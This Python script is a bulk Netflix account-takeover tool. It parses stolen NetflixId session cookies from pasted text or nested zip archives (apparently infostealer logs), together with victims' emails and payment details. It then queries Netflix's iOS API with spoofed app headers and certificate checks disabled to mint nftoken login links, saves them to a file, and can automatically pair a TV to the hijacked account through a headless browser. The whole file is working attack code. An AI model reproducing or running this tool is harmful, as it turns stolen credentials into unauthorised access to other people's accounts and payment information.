import io
import json
import os
import queue
import re
import sys
import threading
import urllib.parse
import zipfile
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning

INPUT_FILE = "input.txt"
OUTPUT_FILE = "NFTOKEN.TXT"
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"
MAX_COOKIES = 10000
MAX_ZIP_ENTRY_BYTES = 10 * 1024 * 1024
MAX_ZIP_TOTAL_BYTES = 100 * 1024 * 1024
SKIP_ZIP_DIRS = ("__macosx/", ".git/", "node_modules/")
SKIP_ZIP_EXTS = (
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp", ".ico", ".svg",
    ".exe", ".dll", ".so", ".dylib", ".bin", ".msi", ".bat", ".cmd",
    ".db", ".sqlite", ".sqlite3", ".ldb", ".pak",
    ".pdf", ".mp3", ".mp4", ".avi", ".mkv", ".mov", ".wav",
    ".woff", ".woff2", ".ttf", ".otf", ".eot",
)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def _is_placeholder(text):
    return text.strip() == "NetflixId=...; SecureNetflixId=...; nfvdid=..."


def read_input_file():
    if not os.path.exists(INPUT_FILE):
        return None
    with open(INPUT_FILE, "r", encoding="utf-8") as file_handle:
        content = file_handle.read().strip()
    if not content or _is_placeholder(content):
        return None
    return content


def _has_buffered_input():
    if os.name != "nt" or not sys.stdin.isatty():
        return False
    try:
        import msvcrt

        return msvcrt.kbhit()
    except Exception:
        return False


def _drain_console_buffer():
    # Consume leftover pasted lines on Windows so cmd.exe does not execute them after exit.
    if os.name != "nt" or not sys.stdin.isatty():
        return
    try:
        import msvcrt

        while msvcrt.kbhit():
            msvcrt.getwch()
    except Exception:
        pass


def read_pasted_input():
    print(f"Paste up to {MAX_COOKIES} cookies (press Enter on a blank line when done):", flush=True)
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break

        if not line.strip():
            if _has_buffered_input():
                continue
            if lines:
                break
            return None

        lines.append(line)

        # Keep reading while the paste buffer still has queued lines.
        if _has_buffered_input():
            continue

        joined = "\n".join(lines).strip()

        if joined.startswith(("{", "[")):
            try:
                json.loads(joined)
                break
            except json.JSONDecodeError:
                continue

        if extract_cookie_list(joined):
            break

    _drain_console_buffer()
    return "\n".join(lines).strip() or None


def _resolve_cookie_source(text):
    candidate = text.strip().strip('"').strip("'")
    if candidate and os.path.isfile(candidate):
        if candidate.lower().endswith(".zip"):
            return ("zip", candidate)
        with open(candidate, "r", encoding="utf-8", errors="ignore") as file_handle:
            return ("text", file_handle.read().strip())
    return ("text", text)


def get_raw_cookie():
    if len(sys.argv) > 1:
        return " ".join(sys.argv[1:]).strip()

    if not sys.stdin.isatty():
        piped = sys.stdin.read().strip()
        if piped:
            return piped

    if sys.stdin.isatty():
        pasted = read_pasted_input()
        if pasted:
            return pasted

    return read_input_file()


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: _decode_cookie_value(parts[6])}

    # Handle Netscape lines whose tabs were stripped during copy/paste.
    key_pattern = "|".join(re.escape(k) for k in sorted(COOKIE_KEYS, key=len, reverse=True))
    match = re.search(rf"(?:TRUE|FALSE)\d+({key_pattern})(\S+)", line.strip())
    if match:
        return {match.group(1): _decode_cookie_value(match.group(2))}

    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def _is_valid_netflix_id(value):
    return isinstance(value, str) and len(value) >= 10 and value != "..."


ACCOUNT_INFO_FIELDS = {
    "name": "Name",
    "email": "Email",
    "country": "Country",
    "plan": "Plan",
    "member since": "Member Since",
    "next billing": "Next Billing",
    "payment": "Payment",
    "card": "Card",
    "phone": "Phone",
    "quality": "Quality",
    "streams": "Streams",
    "price": "Price",
    "hold status": "Hold Status",
    "extra member": "Extra Member",
    "email verified": "Email Verified",
    "profiles": "Profiles",
}
_INFO_LINE_RE = re.compile(r"^[^\w]*([A-Za-z][A-Za-z0-9 _/-]{1,32}?)\s*[:=]\s*(.+?)\s*$")
_SKIP_INFO_KEYS = {"http", "https", "ftp", "login url", "expires", "cookie"} | {
    k.lower() for k in COOKIE_KEYS
}


def _parse_account_info_line(line):
    if "\t" in line or line.startswith(("{", "[", '"')):
        return None
    if re.search(r"(?:TRUE|FALSE)\d+", line):
        return None

    match = _INFO_LINE_RE.match(line)
    if not match:
        return None

    key_raw, value = match.group(1).strip(), match.group(2).strip()
    key_lower = key_raw.lower()
    if key_lower in _SKIP_INFO_KEYS or value.startswith("//") or not value:
        return None

    canonical = ACCOUNT_INFO_FIELDS.get(key_lower, key_raw)
    return canonical, value


def extract_cookie_entries(text, limit=MAX_COOKIES):
    entries = []
    seen = {}

    def add_entry(value, info=None):
        if not isinstance(value, str):
            return
        decoded = _decode_cookie_value(value).strip()
        if not _is_valid_netflix_id(decoded):
            return
        if decoded in seen:
            if info:
                for k, v in info.items():
                    seen[decoded]["info"].setdefault(k, v)
            return
        entry = {"cookie": decoded, "info": dict(info) if info else {}}
        seen[decoded] = entry
        entries.append(entry)

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for item in data:
            if not isinstance(item, dict):
                continue
            if item.get("name") == REQUIRED_COOKIE:
                add_entry(item.get("value"))
            elif REQUIRED_COOKIE in item:
                info = {
                    ACCOUNT_INFO_FIELDS[k.lower()]: str(v)
                    for k, v in item.items()
                    if isinstance(k, str) and k.lower() in ACCOUNT_INFO_FIELDS and v is not None
                }
                add_entry(item.get(REQUIRED_COOKIE), info)
    elif isinstance(data, dict):
        if REQUIRED_COOKIE in data:
            info = {
                ACCOUNT_INFO_FIELDS[k.lower()]: str(v)
                for k, v in data.items()
                if isinstance(k, str) and k.lower() in ACCOUNT_INFO_FIELDS and v is not None
            }
            add_entry(data.get(REQUIRED_COOKIE), info)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                if isinstance(cookie, dict) and cookie.get("name") == REQUIRED_COOKIE:
                    add_entry(cookie.get("value"))

    current_info = {}
    saw_cookie_since_info = False
    trailing_info = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        info_pair = _parse_account_info_line(line)
        if info_pair:
            key, val = info_pair
            if saw_cookie_since_info and key in ("Name", "Email"):
                current_info = {}
                saw_cookie_since_info = False
            current_info[key] = val
            if len(entries) == 1 and not entries[0]["info"]:
                trailing_info[key] = val
            continue

        line_tokens = []
        netscape_cookie = parse_netscape_cookie_line(line)
        if REQUIRED_COOKIE in netscape_cookie:
            line_tokens.append(netscape_cookie[REQUIRED_COOKIE])

        for match in re.finditer(rf"(?<!\w){re.escape(REQUIRED_COOKIE)}=([^;,\s]+)", line):
            line_tokens.append(match.group(1))

        if line_tokens:
            for tok in line_tokens:
                add_entry(tok, current_info)
            saw_cookie_since_info = True

    if len(entries) == 1 and not entries[0]["info"] and trailing_info:
        entries[0]["info"] = trailing_info

    return entries[:limit]


def extract_cookie_list(text, limit=MAX_COOKIES):
    return [entry["cookie"] for entry in extract_cookie_entries(text, limit=limit)]


def _should_skip_zip_entry(info):
    if info.is_dir() or info.file_size <= 0 or info.file_size > MAX_ZIP_ENTRY_BYTES:
        return True
    name_lower = info.filename.replace("\\", "/").lower()
    if any(part in name_lower for part in SKIP_ZIP_DIRS):
        return True
    if name_lower.endswith(SKIP_ZIP_EXTS):
        return True
    return False


def extract_cookie_entries_from_zip(zip_source, limit=MAX_COOKIES, _depth=0):
    if _depth > 2:
        return []

    found = []
    seen = {}
    total_read = 0

    src = io.BytesIO(zip_source) if isinstance(zip_source, (bytes, bytearray)) else zip_source

    with zipfile.ZipFile(src, "r") as zf:
        for info in zf.infolist():
            if len(found) >= limit or total_read >= MAX_ZIP_TOTAL_BYTES:
                break
            if _should_skip_zip_entry(info):
                continue

            try:
                raw_bytes = zf.read(info)
            except Exception:
                continue

            total_read += len(raw_bytes)
            name_lower = info.filename.lower()

            if name_lower.endswith(".zip") or raw_bytes.startswith(b"PK\x03\x04"):
                try:
                    nested = extract_cookie_entries_from_zip(
                        raw_bytes, limit=limit - len(found), _depth=_depth + 1
                    )
                    for entry in nested:
                        tok = entry["cookie"]
                        if tok not in seen:
                            seen[tok] = entry
                            found.append(entry)
                except zipfile.BadZipFile:
                    pass
                continue

            # Skip binary files before decoding.
            if b"\x00" in raw_bytes[:4096]:
                continue

            text = raw_bytes.decode("utf-8", errors="ignore")
            if REQUIRED_COOKIE not in text:
                continue

            for entry in extract_cookie_entries(text, limit=limit - len(found)):
                tok = entry["cookie"]
                if tok not in seen:
                    seen[tok] = entry
                    found.append(entry)
                    if len(found) >= limit:
                        break
                elif entry["info"]:
                    for k, v in entry["info"].items():
                        seen[tok]["info"].setdefault(k, v)

    return found[:limit]


def extract_cookies_from_zip(zip_source, limit=MAX_COOKIES, _depth=0):
    return [
        entry["cookie"]
        for entry in extract_cookie_entries_from_zip(zip_source, limit=limit, _depth=_depth)
    ]


def build_nftoken_link(token):
    return f"https://netflix.com/?nftoken={token}"


def build_tv_nftoken_link(token):
    return f"https://www.netflix.com/tv2?nftoken={token}"


_TV_QUEUE = queue.Queue()
_TV_WORKER_STARTED = False
_TV_WORKER_LOCK = threading.Lock()


def _launch_playwright_browser(p):
    for launch_kwargs in (
        {"headless": True},
        {"headless": True, "channel": "msedge"},
        {"headless": True, "channel": "chrome"},
    ):
        try:
            return p.chromium.launch(**launch_kwargs)
        except Exception:
            continue
    raise RuntimeError("No Chromium/Edge/Chrome browser available for Playwright.")


def _run_tv_job(browser, token, clean_code):
    login_url = build_nftoken_link(token)
    tv_url = "https://www.netflix.com/tv2"

    context = browser.new_context(
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        ),
        locale="en-US",
    )
    try:
        # Block heavy static assets so nftoken + /tv2 resolve in minimal time.
        context.route(
            "**/*",
            lambda route: route.abort()
            if route.request.resource_type in ("image", "media", "font")
            else route.continue_(),
        )
        page = context.new_page()

        page.goto(login_url, wait_until="domcontentloaded", timeout=20000)
        try:
            page.wait_for_function("() => !window.location.search.includes('nftoken=')", timeout=10000)
        except Exception:
            pass

        page.goto(tv_url, wait_until="domcontentloaded", timeout=20000)
        if "/login" in page.url.lower():
            raise RuntimeError(f"nftoken did not establish session (landed on {page.url}).")

        for banner_sel in ("#onetrust-accept-btn-handler", "button:has-text('Accept')"):
            try:
                btn = page.locator(banner_sel)
                if btn.count() > 0 and btn.first.is_visible():
                    btn.first.click()
                    break
            except Exception:
                pass

        code_selector = (
            "input[data-uia*='code']:visible, input[data-uia*='pin']:visible, "
            "input[name*='code']:visible, input[name*='pin']:visible, "
            "input[type='text']:visible, input[type='tel']:visible, "
            "input[type='number']:visible, input:not([type]):visible"
        )
        page.wait_for_selector(code_selector, timeout=15000)

        inputs = page.locator(code_selector)
        count = inputs.count()
        if count == 0:
            raise RuntimeError(f"No code input found on {page.url}.")

        if count >= len(clean_code):
            for idx, ch in enumerate(clean_code):
                inputs.nth(idx).fill(ch)
        else:
            inputs.first.click()
            inputs.first.fill(clean_code)

        submit_btn = page.locator(
            "button[type='submit']:visible, button[data-uia*='submit']:visible, "
            "button[data-uia*='continue']:visible, button:has-text('Continue'):visible"
        )
        if submit_btn.count() > 0:
            submit_btn.first.click()
        else:
            page.keyboard.press("Enter")

        try:
            page.wait_for_load_state("networkidle", timeout=3500)
        except Exception:
            page.wait_for_timeout(1200)

        body_text = (page.locator("body").inner_text(timeout=3000) or "").strip()
        return page.url, " ".join(body_text.split())[:180]
    finally:
        context.close()


def _tv_worker_loop():
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        browser = _launch_playwright_browser(p)
        try:
            while True:
                token, clean_code, result_q = _TV_QUEUE.get()
                try:
                    if not browser.is_connected():
                        browser = _launch_playwright_browser(p)
                    res = _run_tv_job(browser, token, clean_code)
                    result_q.put((True, res))
                except Exception as exc:
                    result_q.put((False, exc))
                finally:
                    _TV_QUEUE.task_done()
        finally:
            try:
                browser.close()
            except Exception:
                pass


def _ensure_tv_worker():
    global _TV_WORKER_STARTED
    with _TV_WORKER_LOCK:
        if not _TV_WORKER_STARTED:
            threading.Thread(target=_tv_worker_loop, daemon=True).start()
            _TV_WORKER_STARTED = True


def activate_tv_with_nftoken(token, code):
    clean_code = re.sub(r"[\s\-]+", "", str(code).strip())
    if not re.fullmatch(r"\d{6,8}", clean_code):
        raise ValueError("TV code must be 6 to 8 digits.")

    _ensure_tv_worker()
    result_q = queue.Queue(maxsize=1)
    _TV_QUEUE.put((token, clean_code, result_q))
    ok, payload = result_q.get(timeout=45)
    if not ok:
        raise payload
    return payload


def fetch_nftoken(netflix_id, session=None):
    if not netflix_id or netflix_id == "...":
        raise ValueError("Missing or placeholder NetflixId.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    client = session or requests
    response = client.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        detail = data.get("error") or data.get("message") or json.dumps(data)[:300]
        raise ValueError(f"No token found in response ({detail})")

    # Normalize 13-digit millisecond timestamps to seconds.
    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def main():
    raw_cookie = get_raw_cookie()
    if raw_cookie is None:
        print(f"No cookie provided and {INPUT_FILE} has no valid cookie.")
        return

    kind, payload = _resolve_cookie_source(raw_cookie)
    if kind == "zip":
        try:
            cookies = extract_cookies_from_zip(payload, limit=MAX_COOKIES)
        except Exception as exc:
            print(f"Failed to read zip: {exc}")
            return
    else:
        cookies = extract_cookie_list(payload, limit=MAX_COOKIES)

    if not cookies:
        print("No valid NetflixId cookie found in input.")
        return

    total = len(cookies)
    print(f"Fetching {total} token(s)...", flush=True)

    succeeded = 0
    failed = 0

    with requests.Session() as session, open(OUTPUT_FILE, "w", encoding="utf-8") as out_file:
        for idx, netflix_id in enumerate(cookies, start=1):
            try:
                token, expires = fetch_nftoken(netflix_id, session=session)
            except (requests.RequestException, ValueError):
                failed += 1
            else:
                succeeded += 1
                out_file.write(f"Login URL : {build_nftoken_link(token)}\n")
                out_file.write(f"Expires   : {format_expiry(expires)}\n\n")
                out_file.flush()

            if idx % 25 == 0 or idx == total:
                print(f"Progress: {idx}/{total} (ok: {succeeded}, failed: {failed})", flush=True)

    print(f"Saved {succeeded} token(s) to {OUTPUT_FILE}.")


if __name__ == "__main__":
    main()
